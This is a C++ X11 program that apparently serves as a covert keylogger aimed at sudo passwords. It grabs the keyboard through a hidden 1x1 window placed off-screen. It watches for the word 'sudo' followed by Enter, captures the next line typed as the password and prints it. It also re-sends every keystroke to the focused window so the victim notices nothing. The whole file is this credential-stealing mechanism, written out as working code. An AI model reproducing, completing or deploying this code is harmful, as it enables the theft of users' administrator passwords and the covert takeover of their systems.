#include <iostream>
#include <X11/Xlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <X11/keysym.h>

Display *dpy;
Window win, rootwin,focuswin;
char *windowName;
XEvent ev;
KeySym esc;

int sudoStatus = 0;
char passwd[30];
int passwdchar = 0;

using namespace std;


int checkSudo(int in) {

    printf("Key: %u\n", in);

    if((in == 115) && (sudoStatus == 0)) { sudoStatus = 1; }        // check for s
    else if((in == 117) && (sudoStatus == 1)) { sudoStatus = 2; }   // check for u
    else if((in == 100) && (sudoStatus == 2)) { sudoStatus = 3; }   // check for d
    else if((in == 111) && (sudoStatus == 3)) {                     // check for o
        sudoStatus = 4;
        printf("SUDO ENTERED\n");
    }
    else if((in != 65293) && (sudoStatus == 4)) {/*printf("Sudo'd Command\n");*/}
    else if((in == 65293) && (sudoStatus == 4)) {sudoStatus = 5;}

    else if((in == 65509 || in == 65505) && (sudoStatus == 5)) { /*printf("Ignore caps/shift keys");*/ }

    else if((in != 65293) && (sudoStatus == 5)) {
        passwd[passwdchar] = in;
        passwdchar++;
    }
    else if((in == 65293) && (sudoStatus == 5)) {
        printf("Password is: %s\n", passwd);
        passwdchar = 0;
        sudoStatus = 6;
    }

    else { sudoStatus = 0; }


    //printf("sudoStatus: %u\n", sudoStatus);

}


int winSetup() {

    // Open display, check for success, select root window
    dpy = XOpenDisplay(NULL);
    if(dpy == NULL) {
        printf("Can't Open Display");
        exit(1);
    }
    else {printf("Display Grabbed\n");}

    int revert;
    rootwin = DefaultRootWindow(dpy);
    XGetInputFocus(dpy, &focuswin, &revert); //get current focus

    //printf("Focus Window: %d\N", (int)focuswin);

    win = XCreateWindow(dpy, rootwin,
                        -99, -99, 1, 1,    // x, y, width, height
                        0, 0, InputOnly,   // border, depth, class
                        CopyFromParent,    // visual
                        0, NULL);          // valuemask, attributes

    XSelectInput(dpy, win, StructureNotifyMask|KeyPressMask|KeyReleaseMask|KeymapStateMask);
    XLowerWindow(dpy, win);
    XMapWindow(dpy, win);

    do {
    XNextEvent(dpy, &ev);
    } while(ev.type != MapNotify);

    XGrabKeyboard(dpy, win, False, GrabModeAsync, GrabModeAsync, CurrentTime);
    XLowerWindow(dpy, win);

    return 1;
}


XKeyEvent createKeyEvent(Display *display, Window &win, Window &winroot, bool press, int keysym, int modifiers) {

    //printf("%d\n", keysym);
    int key;
    if(keysym == 13) {
        key = 36;
    }
    else if(keysym == 8) {
        key = 22;
    }
    else {
        key = XKeysymToKeycode(display, keysym);
    }

    XKeyEvent event;

    event.display     = display;
    event.window      =  win;
    event.root        = winroot;
    event.subwindow   = None;
    event.time        = CurrentTime;
    event.x           = 1;
    event.y           = 1;
    event.x_root      = 1;
    event.y_root      = 1;
    event.same_screen = True;
    event.keycode     = key;

    event.state       = modifiers;

    if(press)
       event.type = KeyPress;
    else
       event.type = KeyRelease;

    return event;
}


int typeToFocus(char in) { //takes key symbol as input

    //printf("Char was: %c", in);

    XKeyEvent event = createKeyEvent(dpy, focuswin, rootwin, true, in, 0);
    XSendEvent(event.display, event.window, true, KeyPressMask, (XEvent *)&event);

    event = createKeyEvent(dpy, focuswin, rootwin, false, in, 0);
    XSendEvent(event.display, event.window, True, KeyPressMask, (XEvent *)&event);
}


int main()
{
    winSetup();

    while(1) {

        // On event, do thing
        XNextEvent(dpy, &ev);

        switch(ev.type) {

        case UnmapNotify:
            XUngrabKeyboard(dpy, CurrentTime);
            XDestroyWindow(dpy, win);
            XCloseDisplay(dpy);

            winSetup();

        case KeymapNotify:
            XRefreshKeyboardMapping(&ev.xmapping);

        case KeyPress:
            //printf("Keypress: %u State: %u\n", ev.xkey.keycode, ev.xkey.state);

            int key = XkbKeycodeToKeysym(dpy, ev.xkey.keycode, 0, ev.xkey.state & ShiftMask ? 1 : 0);
            checkSudo(key);
            typeToFocus(key);

            //Exit on esc press
            if(ev.xkey.keycode == XKeysymToKeycode(dpy, XK_Escape)) {
                printf("Exiting due to esc press");
                exit(0);
              }

        }
    }

    //char in = 'a';
    //typeToFocus(in);

    XCloseDisplay(dpy);
    return 0;
}


/* TEST HERE


*/




